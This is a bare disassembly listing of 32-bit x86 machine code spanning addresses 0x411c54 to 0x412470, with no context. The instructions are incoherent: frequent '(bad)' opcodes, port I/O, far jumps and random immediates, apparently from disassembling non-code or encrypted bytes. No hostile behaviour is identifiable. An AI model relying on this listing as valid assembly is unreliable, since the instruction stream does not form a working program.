  411c54:	mov    ebx,0x1635db4c
  411c59:	(bad)  
  411c5a:	mov    DWORD PTR [eax+ecx*2+0x7e532eda],esi
  411c61:	dec    ebp
  411c62:	xor    eax,0xf688e954
  411c67:	jle    0x411ca0
  411c69:	bound  edi,QWORD PTR [edi]
  411c6b:	loope  0x411ce7
  411c6d:	push   0x4eef87e7
  411c72:	shr    BYTE PTR [edi+0x40],0x84
  411c76:	test   eax,0x8bb8357f
  411c7b:	dec    ecx
  411c7c:	stos   BYTE PTR es:[edi],al
  411c7d:	pusha  
  411c7e:	outs   dx,BYTE PTR ds:[esi]
  411c7f:	pop    eax
  411c80:	mov    bh,0xfb
  411c82:	push   eax
  411c83:	cmc    
  411c84:	outs   dx,DWORD PTR ds:[esi]
  411c85:	fcom   DWORD PTR [ebx-0x3]
  411c88:	xor    DWORD PTR [ebp-0x29ad29d9],0xb717c6ca
  411c92:	sub    ebp,DWORD PTR [ecx+eiz*8]
  411c95:	std    
  411c96:	adc    eax,0xb8ae7674
  411c9b:	xchg   edi,eax
  411c9c:	mov    esp,DWORD PTR [esi-0x4e2024a6]
  411ca2:	mov    esp,0x505c7222
  411ca7:	cdq    
  411ca8:	scas   al,BYTE PTR es:[edi]
  411ca9:	ficomp WORD PTR [eax+0x1731a2e3]
  411caf:	popf   
  411cb0:	and    eax,0x42fa0d36
  411cb5:	xor    ch,BYTE PTR [ecx+esi*1+0x2c5f8ab2]
  411cbc:	sub    cl,BYTE PTR [edx-0x1e]
  411cbf:	xor    dh,BYTE PTR [eax]
  411cc1:	test   DWORD PTR [ebp-0x9],0xecc894d5
  411cc8:	cmp    cl,0x6d
  411ccb:	xor    al,0x46
  411ccd:	mov    esp,0xc3ab5965
  411cd2:	dec    esp
  411cd3:	sbb    eax,0xe4c4ced4
  411cd8:	pop    ebp
  411cd9:	dec    edx
  411cda:	adc    ebx,eax
  411cdc:	out    dx,al
  411cdd:	or     ch,BYTE PTR [edi+0x43205cae]
  411ce3:	ins    BYTE PTR es:[edi],dx
  411ce4:	nop
  411ce5:	push   cs
  411ce6:	mov    ebx,0x39c3fe15
  411ceb:	ds add esi,0xedd832f2
  411cf2:	dec    edi
  411cf3:	mov    cl,0x95
  411cf5:	lahf   
  411cf6:	push   esp
  411cf7:	enter  0xf11a,0xcd
  411cfb:	dec    esp
  411cfc:	inc    edi
  411cfd:	push   esi
  411cfe:	(bad)  
  411cff:	cs sti 
  411d01:	jae    0x411d4e
  411d03:	pop    edx
  411d04:	jbe    0x411c91
  411d06:	cmp    BYTE PTR [ebp-0x1894d1da],0x8d
  411d0d:	int3   
  411d0e:	retf   
  411d0f:	push   edi
  411d10:	jbe    0x411d40
  411d12:	in     al,0xf8
  411d14:	pop    ss
  411d15:	push   edx
  411d16:	xchg   esp,ebx
  411d18:	mov    dh,0x4a
  411d1a:	jno    0x411d04
  411d1c:	jge    0x411d20
  411d1e:	adc    ebx,esp
  411d20:	sbb    cl,BYTE PTR [ebx+0x4a8d38a9]
  411d26:	fcmovu st,st(5)
  411d28:	retf   
  411d29:	loop   0x411cf1
  411d2b:	sbb    eax,0xd1b59cd3
  411d30:	and    bl,BYTE PTR [eax-0x5acd24ea]
  411d36:	cli    
  411d37:	cld    
  411d38:	dec    ecx
  411d39:	in     eax,0x50
  411d3b:	or     dh,BYTE PTR [edx+ecx*8-0x4b8b6dfa]
  411d42:	aad    0xd5
  411d44:	(bad)  
  411d45:	fldcw  WORD PTR [eax-0x10]
  411d48:	adc    BYTE PTR [edi],al
  411d4a:	dec    ecx
  411d4b:	dec    eax
  411d4c:	xchg   DWORD PTR [edi-0x2e],ebp
  411d4f:	fcomp  DWORD PTR [esi+0x32]
  411d52:	add    DWORD PTR [eax-0xbcf1ee6],edx
  411d58:	and    DWORD PTR [edx-0x69b0498f],0x69817cb0
  411d62:	aaa    
  411d63:	xor    eax,0x8f9ce9d4
  411d68:	adc    eax,0x1db8f273
  411d6d:	jo     0x411d56
  411d6f:	cmp    ah,al
  411d71:	inc    esi
  411d72:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  411d73:	psubw  mm2,QWORD PTR [ecx]
  411d76:	ror    DWORD PTR [edx],1
  411d78:	or     esp,DWORD PTR [ebx-0x54770b16]
  411d7e:	bnd jge 0x411dbf
  411d81:	pusha  
  411d82:	ja     0x411da6
  411d84:	imul   ebx,DWORD PTR [edi-0x5afdc3cf],0x9578dd72
  411d8e:	(bad)  
  411d8f:	fnstcw WORD PTR [ebx]
  411d91:	jbe    0x411d69
  411d93:	sub    ch,al
  411d95:	adc    BYTE PTR [ecx],bl
  411d97:	mov    ah,0x6b
  411d99:	push   cs
  411d9a:	stos   BYTE PTR es:[edi],al
  411d9b:	mov    esi,0xb363365f
  411da0:	push   0x15da2b6e
  411da5:	ins    DWORD PTR es:[edi],dx
  411da6:	ds es sbb al,0xf1
  411daa:	or     al,0x4e
  411dac:	push   edi
  411dad:	cwde   
  411dae:	shl    BYTE PTR [esi+0x708f4f3f],0x31
  411db5:	fst    QWORD PTR [edi-0xb]
  411db8:	loop   0x411dff
  411dba:	and    BYTE PTR [esi],0x4b
  411dbd:	xchg   ecx,eax
  411dbe:	sbb    DWORD PTR [ebx+0xf],esp
  411dc1:	test   DWORD PTR [ebx+esi*8+0x7b390da9],esp
  411dc8:	js     0x411d9e
  411dca:	outs   dx,BYTE PTR ds:[esi]
  411dcb:	pop    ebx
  411dcc:	or     al,0x26
  411dce:	or     DWORD PTR [ecx],ebp
  411dd0:	ja     0x411dd4
  411dd2:	sub    DWORD PTR [esi+eax*1+0x65fdbfa2],0x28
  411dda:	ins    DWORD PTR es:[edi],dx
  411ddb:	mov    al,ds:0xc79def1d
  411de0:	xor    bl,BYTE PTR [ebx-0x1885088a]
  411de6:	fist   DWORD PTR [ebx-0x68dfed0d]
  411dec:	and    cl,BYTE PTR [edi+edx*4+0x27]
  411df0:	lods   al,BYTE PTR ds:[esi]
  411df1:	(bad)  
  411df2:	iret   
  411df3:	ret    
  411df4:	sub    DWORD PTR [edx-0x5a],esp
  411df7:	pop    ecx
  411df8:	jno    0x411e3f
  411dfa:	push   0xa52520f9
  411dff:	dec    edi
  411e00:	loop   0x411e1a
  411e02:	int3   
  411e03:	mov    ebx,0x6bcd1e11
  411e08:	stos   BYTE PTR es:[edi],al
  411e09:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  411e0a:	sti    
  411e0b:	mov    ecx,0x9a5b3e40
  411e10:	push   ecx
  411e11:	mov    ds:0x5d880492,eax
  411e16:	and    DWORD PTR [ecx-0x22],esp
  411e19:	pop    ds
  411e1a:	push   edi
  411e1b:	mov    esi,0xecb5160b
  411e20:	retf   
  411e21:	cdq    
  411e22:	xor    al,BYTE PTR [edi-0x294cc13f]
  411e28:	std    
  411e29:	cmp    BYTE PTR [edx+esi*8+0x391623d8],dl
  411e30:	sti    
  411e31:	stos   BYTE PTR es:[edi],al
  411e32:	pop    esi
  411e33:	std    
  411e34:	mov    bh,0x77
  411e36:	lock sbb eax,0x2a583cba
  411e3c:	cmp    al,0x19
  411e3e:	ds dec edx
  411e40:	add    eax,0x26355dbf
  411e45:	bnd ja 0x411e98
  411e48:	push   eax
  411e4a:	out    0xf6,eax
  411e4c:	adc    DWORD PTR [ebx-0x7bd05b8f],0xb
  411e53:	dec    edx
  411e54:	xchg   edi,eax
  411e55:	lahf   
  411e56:	pop    ecx
  411e57:	jle    0x411eb4
  411e59:	sub    DWORD PTR [edx+esi*2+0x60f6df5f],edx
  411e60:	retf   0xe441
  411e63:	inc    ebp
  411e64:	jmp    0xedb2ce84
  411e69:	sbb    BYTE PTR [edx],ah
  411e6b:	daa    
  411e6c:	arpl   WORD PTR [ebp-0x25501451],sp
  411e72:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  411e73:	dec    edi
  411e74:	cli    
  411e75:	dec    ecx
  411e76:	mov    esi,0x9fb9ee41
  411e7b:	mov    ebp,0x574f6a53
  411e80:	adc    eax,0x4e6e382b
  411e85:	loop   0x411e83
  411e87:	pop    eax
  411e88:	not    DWORD PTR [ebx-0x27]
  411e8b:	xchg   esp,eax
  411e8c:	xlat   BYTE PTR ds:[ebx]
  411e8d:	ror    DWORD PTR [eax+0xc],1
  411e90:	pop    ebx
  411e91:	mov    ah,0x27
  411e93:	xlat   BYTE PTR ds:[ebx]
  411e94:	scas   al,BYTE PTR es:[edi]
  411e95:	xor    DWORD PTR [esi+edx*1+0x46ab6274],edx
  411e9c:	jmp    0xfc3a03af
  411ea1:	jnp    0x411e60
  411ea3:	xor    BYTE PTR [ebp+0x10],bh
  411ea6:	sahf   
  411ea7:	shl    BYTE PTR [ebp+0x6f],cl
  411eaa:	mov    ebx,0x1dd01dc7
  411eaf:	aas    
  411eb0:	leave  
  411eb1:	and    al,0xb6
  411eb3:	inc    ecx
  411eb4:	jne    0x411e6f
  411eb6:	fwait
  411eb7:	mov    eax,ds:0x45899872
  411ebc:	nop
  411ebd:	jle    0x411e57
  411ebf:	cwde   
  411ec0:	xchg   esp,eax
  411ec1:	xchg   edi,eax
  411ec2:	pop    edx
  411ec3:	pop    ebx
  411ec4:	mov    dh,0xeb
  411ec6:	or     BYTE PTR [esi],ch
  411ec8:	xchg   ebx,eax
  411ec9:	push   edx
  411eca:	das    
  411ecb:	test   DWORD PTR [ebp+0xfd1ddc2],eax
  411ed1:	leave  
  411ed2:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  411ed3:	mov    BYTE PTR [ecx-0x73],cl
  411ed6:	and    esi,DWORD PTR [eax+edx*2]
  411ed9:	inc    edx
  411eda:	popa   
  411edb:	aad    0x37
  411edd:	mov    edi,0xd3140de
  411ee2:	popf   
  411ee3:	and    DWORD PTR [edi+eiz*1-0x47],0xfa639740
  411eeb:	ret    0x9aab
  411eee:	pop    edi
  411eef:	jne    0x411ec1
  411ef1:	dec    BYTE PTR [ebp+0x32]
  411ef4:	push   ebp
  411ef5:	loope  0x411eac
  411ef7:	ja     0x411f2a
  411ef9:	jle    0x411f13
  411efb:	imul   ecx,DWORD PTR [esi-0x3b39b36a],0xffffffb1
  411f02:	in     al,dx
  411f03:	jns    0x411ea9
  411f05:	cmc    
  411f06:	adc    dl,BYTE PTR ds:0x4dc46c39
  411f0c:	jl     0x411eec
  411f0e:	shl    DWORD PTR [ebx+0xa],1
  411f11:	and    DWORD PTR [ebp+0x6e011619],edx
  411f17:	pop    edi
  411f18:	pop    esi
  411f19:	jmp    0x7d7e55ca
  411f1e:	dec    esi
  411f1f:	out    0xad,eax
  411f21:	jle    0x411f9b
  411f23:	ins    BYTE PTR es:[edi],dx
  411f24:	add    ebp,DWORD PTR [edi-0x61]
  411f27:	cmp    esp,DWORD PTR [eax]
  411f29:	fnstcw WORD PTR [esi+ebx*2]
  411f2c:	lds    edi,FWORD PTR [edx+0x30497d82]
  411f32:	pop    eax
  411f33:	mov    ebp,0x1ab72944
  411f38:	inc    edi
  411f39:	jl     0x411f6a
  411f3b:	ss in  eax,0xa7
  411f3e:	sbb    cl,BYTE PTR ds:0xdc29f83a
  411f44:	stos   DWORD PTR es:[edi],eax
  411f45:	lea    ecx,[eax-0x40]
  411f48:	sub    dl,0xb1
  411f4b:	mov    ecx,0x2248b107
  411f50:	aam    0xf4
  411f52:	sbb    DWORD PTR [edi+0x1b],esp
  411f55:	arpl   WORD PTR [ebx],sp
  411f57:	mov    ebp,0xc0eecd4e
  411f5c:	mov    cl,dh
  411f5e:	imul   esi,DWORD PTR [edi+esi*2],0xffffffe2
  411f62:	jmp    0x3249e120
  411f67:	inc    edi
  411f68:	xchg   edx,eax
  411f69:	cmc    
  411f6a:	lahf   
  411f6b:	or     al,0x25
  411f6d:	nop
  411f6e:	push   eax
  411f6f:	xor    al,0xc1
  411f71:	je     0x411f9d
  411f73:	cdq    
  411f74:	lea    ecx,[edx]
  411f76:	adc    eax,0xa2a2b8d0
  411f7b:	mov    esp,0xa7a7b4f
  411f80:	mov    edi,0x7d1f0783
  411f85:	xchg   ecx,eax
  411f86:	sub    al,0xba
  411f88:	cmp    dl,BYTE PTR [esi]
  411f8a:	pop    es
  411f8b:	test   eax,0x6e1653e3
  411f90:	push   ebx
  411f91:	or     al,0x93
  411f93:	mov    ebx,DWORD PTR [ebx-0x5aace47e]
  411f99:	cmp    DWORD PTR ds:0xc20c9456,edi
  411f9f:	fsubr  QWORD PTR [edx+0x31e1fd1a]
  411fa5:	mov    WORD PTR [ebx],ds
  411fa7:	mov    ebx,0x78d3f6a8
  411fac:	les    esi,FWORD PTR [ebx-0x28da9200]
  411fb2:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  411fb3:	mov    al,ds:0x82961911
  411fb8:	mov    al,0xac
  411fba:	xchg   ebp,eax
  411fbb:	pop    ebx
  411fbc:	jl     0x41202c
  411fbe:	mov    edx,0xcc44372
  411fc3:	stc    
  411fc4:	dec    edx
  411fc5:	(bad)  
  411fc6:	xor    ch,0x96
  411fc9:	jne    0x41203d
  411fcb:	jne    0x412005
  411fcd:	pop    ebx
  411fce:	loop   0x412000
  411fd0:	out    dx,al
  411fd1:	enter  0xe424,0xeb
  411fd5:	cwde   
  411fd6:	xor    dh,BYTE PTR [ebp-0x77]
  411fd9:	jp     0x411fed
  411fdb:	and    cl,BYTE PTR [ebx-0x7c]
  411fde:	lahf   
  411fdf:	and    DWORD PTR [ebx-0x5274475],eax
  411fe5:	xor    ah,BYTE PTR [esi+0x28]
  411fe8:	dec    ecx
  411fe9:	iret   
  411fea:	jmp    0x2e17:0x29df12ad
  411ff1:	call   0x796ce9c4
  411ff6:	lods   eax,DWORD PTR ds:[esi]
  411ff7:	aam    0xbf
  411ff9:	jle    0x412027
  411ffb:	addr16 pop edi
  411ffd:	popf   
  411ffe:	and    eax,0xdf11f20f
  412003:	lock pcmpeqd mm3,QWORD PTR [esi]
  412007:	dec    ecx
  412008:	push   eax
  412009:	lea    eax,[eax+0x1664ba68]
  41200f:	push   ecx
  412010:	(bad)  
  412011:	mov    ecx,0x530dcda3
  412016:	sub    bl,dl
  412018:	(bad)  
  412019:	mov    edx,0x69b9e06d
  41201e:	stos   DWORD PTR es:[edi],eax
  41201f:	xchg   DWORD PTR [esi],esp
  412021:	cld    
  412022:	loope  0x412029
  412024:	retf   
  412025:	lods   al,BYTE PTR ds:[esi]
  412026:	mov    edx,0x43cecb11
  41202b:	mov    ah,0x71
  41202d:	out    0x40,eax
  41202f:	dec    edx
  412030:	cwde   
  412031:	test   edi,esi
  412033:	aaa    
  412034:	es fld st(2)
  412037:	out    dx,eax
  412038:	add    eax,0xb8df47db
  41203d:	jg     0x411fd9
  41203f:	jp     0x41207b
  412041:	mov    edx,0xde63057b
  412046:	pop    ecx
  412048:	inc    esp
  412049:	inc    ebx
  41204a:	scas   eax,DWORD PTR es:[edi]
  41204b:	sbb    edx,edi
  41204d:	sub    BYTE PTR [ebx],dl
  41204f:	addr16 popa 
  412051:	push   edx
  412052:	mov    ecx,0x60df660f
  412057:	push   esi
  412058:	jmp    0xb707:0xeacc3fcc
  41205f:	push   ebx
  412060:	out    dx,al
  412061:	adc    bh,BYTE PTR [esi+0x5d]
  412064:	imul   esi,DWORD PTR [ebx-0x2d0861a8],0x796c8fbb
  41206e:	mov    al,ds:0x79cf90da
  412073:	jb     0x41200b
  412075:	sub    edi,0x8
  412078:	push   0x26
  41207a:	dec    esi
  41207b:	mov    ebp,0x4b8b2833
  412080:	addr16 lock stc 
  412083:	retf   
  412084:	repnz out dx,eax
  412086:	loope  0x412081
  412088:	or     ebp,edx
  41208a:	or     BYTE PTR [eax+0x6d],al
  41208d:	daa    
  41208e:	inc    ebx
  41208f:	fnstcw WORD PTR [edi+0x7a29f5e9]
  412095:	mov    ds,ebx
  412097:	cmc    
  412098:	fadd   st(3),st
  41209a:	and    esi,DWORD PTR [ebx]
  41209c:	xchg   esp,eax
  41209d:	cwde   
  41209e:	sahf   
  41209f:	mov    eax,0xab31dac5
  4120a4:	fwait
  4120a5:	push   0x77
  4120a7:	stos   BYTE PTR es:[edi],al
  4120a8:	leave  
  4120a9:	es push ss
  4120ab:	adc    eax,0x9776897d
  4120b0:	int    0x50
  4120b2:	cmp    DWORD PTR [ebx-0x5ab0bc28],eax
  4120b8:	mov    ds:0x5b465a62,eax
  4120bd:	retf   
  4120be:	mov    ebx,0x1491bf95
  4120c3:	aad    0x49
  4120c5:	imul   ebx,DWORD PTR [esp+edi*1],0x59
  4120c9:	je     0x412094
  4120cb:	mov    cl,0xc0
  4120cd:	mov    WORD PTR [esi],cs
  4120cf:	call   0x4f21:0x9c47ecaa
  4120d6:	xor    bh,BYTE PTR ds:0x1fe8c5cd
  4120dc:	push   cs
  4120dd:	mov    cl,0x1
  4120df:	push   esi
  4120e0:	and    al,0xda
  4120e2:	stc    
  4120e3:	or     al,0xf9
  4120e5:	test   BYTE PTR [esi-0x35],dh
  4120e8:	inc    esi
  4120e9:	pusha  
  4120ea:	dec    edx
  4120eb:	lock cmp eax,DWORD PTR [esi]
  4120ee:	sahf   
  4120ef:	cmp    eax,DWORD PTR [edi-0x63]
  4120f2:	sub    BYTE PTR [esi-0x799c140c],dl
  4120f8:	mov    ebp,0x40cdbdd2
  4120fd:	iret   
  4120fe:	mov    cl,0xb8
  412100:	(bad)  
  412101:	jl     0x412120
  412103:	pop    edx
  412104:	pop    ds
  412105:	push   edx
  412106:	jae    0x41211e
  412108:	sbb    DWORD PTR [ebx],ebp
  41210a:	test   al,0xaf
  41210c:	mov    esp,0x72d1e479
  412111:	lock and BYTE PTR [eax+0x32e13ed6],dh
  412118:	ret    0x9a33
  41211b:	shl    edx,0x49
  41211e:	sub    eax,0x8e617e98
  412123:	rol    BYTE PTR [esi],cl
  412125:	push   ds
  412126:	jno    0x412134
  412128:	and    ebx,DWORD PTR [ecx+0x3686dd8a]
  41212e:	imul   edi,DWORD PTR [edi+0x4f],0x57
  412132:	in     eax,0xd6
  412134:	xchg   esi,edi
  412136:	mov    ecx,0xd1b6068a
  41213b:	(bad)  
  41213c:	mov    edx,0xd0289da1
  412141:	xor    BYTE PTR [edx+0x7eab38ef],bh
  412147:	push   ebp
  412148:	jecxz  0x41211e
  41214a:	inc    edi
  41214b:	repz std 
  41214d:	pop    esp
  41214e:	push   edi
  41214f:	sar    BYTE PTR [ecx],cl
  412151:	sub    BYTE PTR [ebp-0x5d],dl
  412154:	sbb    esi,DWORD PTR [esi]
  412156:	gs mov edx,0x7684498d
  41215c:	loope  0x4121c5
  41215e:	in     al,0x64
  412160:	add    DWORD PTR [ebp+0x56ef63aa],eax
  412166:	int3   
  412167:	adc    dh,bh
  412169:	rcl    DWORD PTR [eax],cl
  41216b:	imul   ebp,DWORD PTR [edi],0xffffff8e
  41216e:	jmp    0x2331:0x5657b205
  412175:	scas   eax,DWORD PTR es:[edi]
  412176:	loop   0x4121c2
  412178:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  412179:	mov    ch,0x1d
  41217b:	je     0x412104
  41217d:	add    BYTE PTR [edi+0x7],bh
  412180:	out    dx,al
  412181:	call   0x2716:0xaa6db542
  412188:	sar    DWORD PTR [eax],1
  41218a:	jge    0x412164
  41218c:	push   ebp
  41218d:	jne    0x412135
  41218f:	add    DWORD PTR [edx],eax
  412191:	cmp    bh,BYTE PTR [esi]
  412193:	or     al,0xc3
  412195:	and    edx,0x7d
  412198:	cmp    dl,dl
  41219a:	mov    ebp,0x3a3b562f
  41219f:	sbb    DWORD PTR [eax],ebx
  4121a1:	xor    al,0xc3
  4121a3:	push   0x1725c585
  4121a8:	and    eax,DWORD PTR ds:0x3073ea5
  4121ae:	out    0x74,al
  4121b0:	mov    bl,0x61
  4121b2:	mov    esi,0x783e8a43
  4121b7:	dec    ecx
  4121b8:	xchg   ebp,eax
  4121b9:	mov    ecx,DWORD PTR [eax-0x29]
  4121bc:	cli    
  4121bd:	fsubr  st,st(5)
  4121bf:	shl    DWORD PTR [edi],cl
  4121c1:	test   DWORD PTR [ebx-0x1c9dafb0],ebp
  4121c7:	call   0x4878:0x5f4235bf
  4121ce:	jb     0x4121bb
  4121d0:	sbb    al,0x3f
  4121d2:	mov    eax,ds:0x1e3b5029
  4121d7:	cmp    dh,BYTE PTR [ebp-0x56]
  4121da:	and    edi,DWORD PTR [ebx-0x5d2ad564]
  4121e0:	adc    edi,DWORD PTR [ebx+0xa]
  4121e3:	push   cs
  4121e4:	cmp    eax,0x1dc2f67f
  4121e9:	retf   
  4121ea:	jp     0x41220b
  4121ec:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4121ed:	and    DWORD PTR [eax],ebx
  4121ef:	and    DWORD PTR [ebp+0x1b],esi
  4121f2:	(bad)  
  4121f4:	jmp    0xe94f1a0
  4121f9:	out    dx,eax
  4121fa:	and    bl,BYTE PTR [esi]
  4121fc:	pop    edi
  4121fd:	imul   edi,ebp,0x6c
  412200:	pop    esi
  412201:	retf   0xe3b9
  412204:	ins    DWORD PTR es:[edi],dx
  412205:	arpl   WORD PTR [ecx-0x6f6740d4],bx
  41220b:	adc    edx,DWORD PTR [ebp+0x32]
  41220e:	ss mov dh,0xbf
  412211:	out    dx,al
  412212:	mov    ah,0x1e
  412214:	sub    cl,bh
  412216:	loopne 0x4121b7
  412218:	mov    al,BYTE PTR [eax-0x2a55c2a1]
  41221e:	jmp    0x393ca41e
  412223:	test   al,0xc8
  412225:	push   ds
  412226:	mov    esp,0x99ba00d6
  41222b:	and    BYTE PTR [eax-0x5d7fc9bf],0x86
  412232:	loope  0x4121bd
  412234:	push   ds
  412235:	mov    esi,0xad98a99c
  41223a:	cmp    al,0xac
  41223c:	fcomp  DWORD PTR [ebx]
  41223e:	fcom   QWORD PTR [esi+ecx*2-0x55]
  412242:	mov    edx,0x4bac3c0c
  412247:	dec    edi
  412248:	cmp    BYTE PTR [eax],0x37
  41224b:	inc    eax
  41224c:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41224d:	nop
  41224e:	adc    dl,bl
  412250:	jb     0x4122a9
  412252:	mov    dl,0xfa
  412254:	inc    ecx
  412255:	aas    
  412256:	pop    eax
  412257:	inc    edi
  412258:	fwait
  412259:	iret   
  41225a:	scas   al,BYTE PTR es:[edi]
  41225b:	mov    dh,0x6b
  41225d:	(bad)  
  41225e:	arpl   WORD PTR [ecx-0x5fc0e699],si
  412264:	jae    0x4122de
  412266:	fbstp  TBYTE PTR [esp+eax*1+0x41884eba]
  41226d:	inc    esi
  41226e:	push   ebp
  41226f:	fisub  WORD PTR [esi]
  412272:	add    BYTE PTR [ebx],dh
  412274:	mov    ch,0x7c
  412276:	sbb    edi,DWORD PTR [ecx-0x523cb0cc]
  41227c:	fldcw  WORD PTR [ecx+ebp*1-0x1cd4484e]
  412283:	push   0x54f575e8
  412288:	xchg   bh,cl
  41228a:	push   edi
  41228b:	cmp    ebp,DWORD PTR [eax-0x5a713f]
  412291:	inc    edx
  412292:	ja     0x412294
  412294:	enter  0xdadc,0xb1
  412298:	pop    esp
  412299:	repnz sub esp,DWORD PTR [edx]
  41229c:	and    al,0x9e
  41229e:	mov    eax,0x7050662f
  4122a3:	leave  
  4122a4:	xchg   ebx,eax
  4122a5:	cmp    eax,DWORD PTR [ebx]
  4122a7:	push   ds
  4122a8:	mov    WORD PTR [esi+0x50],fs
  4122ab:	inc    esi
  4122ac:	cmp    al,0xc0
  4122ae:	fcomp  DWORD PTR [esi+0x1052ef1a]
  4122b4:	mul    DWORD PTR [esi]
  4122b6:	cmp    BYTE PTR [ebx-0x3adf34bd],dh
  4122bc:	jmp    0xf44cc3a6
  4122c1:	pop    esp
  4122c2:	cmp    BYTE PTR [esi+ecx*4-0xe],dh
  4122c6:	dec    esi
  4122c7:	push   ds
  4122c8:	pop    ebp
  4122c9:	fild   WORD PTR [eax-0x75]
  4122cc:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4122cd:	cmp    eax,ebx
  4122cf:	add    DWORD PTR [ebp+0x15],esi
  4122d2:	pushf  
  4122d3:	fsubr  st(0),st
  4122d5:	xor    esi,ebp
  4122d7:	add    dh,BYTE PTR [esi+0x7d4ad0a1]
  4122dd:	add    al,0x8e
  4122df:	or     eax,0x3389f4eb
  4122e4:	int    0x50
  4122e6:	jo     0x4122e4
  4122e8:	cli    
  4122e9:	loope  0x412314
  4122eb:	mov    DWORD PTR [eax],eax
  4122ed:	jl     0x412330
  4122ef:	sbb    eax,DWORD PTR [edi-0xe67a4dd]
  4122f5:	sub    al,0x99
  4122f7:	out    0xc,al
  4122f9:	stc    
  4122fa:	loop   0x4122ab
  4122fc:	mov    al,ds:0x97f9bcb5
  412301:	into   
  412302:	cmp    BYTE PTR [edx-0x3a793e15],bl
  412308:	inc    ecx
  412309:	fdivp  st(0),st
  41230b:	mov    edx,0x28d10c79
  412310:	jp     0x412335
  412312:	sbb    al,0xed
  412314:	div    DWORD PTR [ebp-0x7614cff0]
  41231a:	add    al,0x91
  41231c:	in     eax,0x5e
  41231e:	out    0xdd,al
  412320:	jle    0x412339
  412322:	fist   WORD PTR cs:[ebx+0x0]
  412326:	lods   al,BYTE PTR ds:[esi]
  412327:	stos   DWORD PTR es:[edi],eax
  412328:	pop    es
  412329:	enter  0x8c0e,0x12
  41232d:	mov    DWORD PTR ss:[ebp+eiz*4+0x4a],esp
  412332:	xchg   ebx,eax
  412333:	push   edx
  412334:	fcomp  DWORD PTR [ecx+0x51]
  412337:	jno    0x4122f3
  412339:	cmp    dh,BYTE PTR [ecx+0x6b]
  41233c:	add    ebp,DWORD PTR [ebx+0x7157f53]
  412342:	jb     0x412341
  412344:	shl    edx,cl
  412346:	and    eax,0x6bbf3386
  41234b:	retf   0x100f
  41234e:	cmc    
  41234f:	retf   
  412350:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  412351:	repnz xchg ebx,eax
  412353:	xchg   ecx,eax
  412354:	mov    ebx,0x4ad4d1c6
  412359:	out    dx,al
  41235a:	stc    
  41235b:	lahf   
  41235c:	out    dx,eax
  41235d:	push   ds
  41235e:	or     al,dl
  412360:	data16 fcmovnu st,st(1)
  412363:	cmp    BYTE PTR [edi-0x4492f25c],0x1f
  41236a:	scas   eax,DWORD PTR es:[edi]
  41236b:	fist   DWORD PTR [eax+ebx*4]
  41236e:	test   al,0x5f
  412370:	sub    eax,0xb8178d67
  412375:	jae    0x41231f
  412377:	clc    
  412378:	cwde   
  412379:	test   eax,0xb18678d2
  41237e:	cwde   
  41237f:	adc    ah,BYTE PTR [ebx+0x2a2bad03]
  412385:	inc    ecx
  412386:	add    al,BYTE PTR [edx]
  412388:	bound  esp,QWORD PTR [edi+0x12813ec6]
  41238e:	cmp    dl,BYTE PTR [esi]
  412390:	(bad)  
  412391:	sbb    al,0x70
  412393:	adc    al,0xac
  412395:	mov    edx,0x800ff666
  41239a:	mov    eax,ds:0x15cb8b70
  41239f:	mov    eax,0x93ff6971
  4123a4:	fld    QWORD PTR [esi]
  4123a6:	into   
  4123a7:	add    eax,0xaf25b63f
  4123ac:	add    edi,ecx
  4123ae:	xchg   BYTE PTR ds:0xacb8,al
  4123b3:	jno    0x4123bb
  4123b5:	xor    BYTE PTR [ecx],ch
  4123b7:	push   0x5fd2fa84
  4123bc:	adc    BYTE PTR [eax-0x548b58a9],bh
  4123c2:	in     eax,0x7c
  4123c4:	jecxz  0x4123db
  4123c6:	es adc eax,0xee62710f
  4123cc:	test   DWORD PTR [ecx-0x3d],0x2ab829b
  4123d3:	in     eax,0xe3
  4123d5:	mov    edi,0x18c2f45d
  4123da:	lock test edx,ebp
  4123dd:	add    ebp,DWORD PTR [edx-0x5]
  4123e0:	push   ebp
  4123e1:	or     BYTE PTR [ebp+0x4d751346],dl
  4123e7:	fwait
  4123e8:	sbb    DWORD PTR [ebp+edi*2-0x2b9c75da],ebp
  4123ef:	dec    DWORD PTR cs:[eax-0x16e81d27]
  4123f6:	push   0xffffffd9
  4123f8:	push   cs
  4123f9:	sub    DWORD PTR [ebx-0x249ee922],esp
  4123ff:	jmp    0x40422403
  412404:	inc    edx
  412405:	rcl    DWORD PTR [edx],0xf3
  412408:	xchg   dx,ax
  41240a:	dec    ecx
  41240b:	or     BYTE PTR [ecx],cl
  41240d:	fwait
  41240e:	push   0xffffffcc
  412410:	mov    dl,0xb8
  412412:	cdq    
  412413:	inc    eax
  412414:	inc    eax
  412415:	mov    ss,WORD PTR [eax-0x4f577a31]
  41241b:	hlt    
  41241c:	inc    esi
  41241d:	xchg   DWORD PTR [ebp-0x6d],esp
  412420:	fwait
  412421:	mov    ds:0xb7141db5,al
  412426:	loope  0x412476
  412428:	dec    esp
  412429:	xchg   ecx,eax
  41242a:	or     DWORD PTR [esp+edx*8],esp
  41242d:	out    dx,al
  41242e:	adc    al,0x18
  412430:	clc    
  412431:	mov    ah,0x2a
  412433:	test   BYTE PTR [esi-0xafdc7f4],dh
  412439:	inc    esp
  41243a:	inc    DWORD PTR [ecx]
  41243c:	test   eax,0xca6bf23c
  412441:	xchg   DWORD PTR ss:[edi+0x2e1881f4],esp
  412448:	inc    esi
  412449:	aaa    
  41244a:	out    0xf1,eax
  41244c:	scas   al,BYTE PTR es:[edi]
  41244d:	stc    
  41244e:	pop    esi
  41244f:	sbb    DWORD PTR [ecx-0x62],ebx
  412452:	inc    ecx
  412453:	ins    DWORD PTR es:[edi],dx
  412454:	repnz cmp DWORD PTR [ebx+0x6c],0xbe3570e5
  41245c:	les    edx,FWORD PTR [esi+0x2d1c7fc9]
  412462:	idiv   BYTE PTR [esi+0xc60c4ad]
  412468:	mov    eax,0x1288bb0c
  41246d:	sub    esp,DWORD PTR [esi-0x2a]
  412470:	xchg   ebp,eax
